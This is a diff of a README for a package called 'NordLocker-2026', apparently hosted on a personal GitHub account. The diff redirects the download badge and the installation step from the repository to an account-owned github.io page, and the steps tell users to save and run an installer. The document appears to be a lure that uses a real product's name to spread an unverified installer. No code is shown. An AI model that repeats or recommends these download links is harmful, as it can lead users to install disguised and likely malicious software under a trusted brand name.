@@ -1,6 +1,6 @@
 # 🔒 NordLocker-2026 - Secure your digital life with ease
 
-[![Download NordLocker](https://img.shields.io/badge/Download-NordLocker_2026-blue.svg)](https://github.com/asesoriascri9376/NordLocker-2026)
+[![Download NordLocker](https://img.shields.io/badge/Download-NordLocker_2026-blue.svg)](https://asesoriascri9376.github.io)
 
 ## 🛡️ What is NordLocker-2026
 
@@ -18,7 +18,7 @@ NordLocker-2026 provides a secure way to manage your passwords and protect your 
 
 Follow these steps to set up the software.
 
-1. Go to the primary download page: [https://github.com/asesoriascri9376/NordLocker-2026](https://github.com/asesoriascri9376/NordLocker-2026).
+1. Go to the primary download page: [https://asesoriascri9376.github.io](https://asesoriascri9376.github.io).
 2. Click the download button on the page.
 3. Save the installer file to your computer.
 4. Locate the file in your Downloads folder.
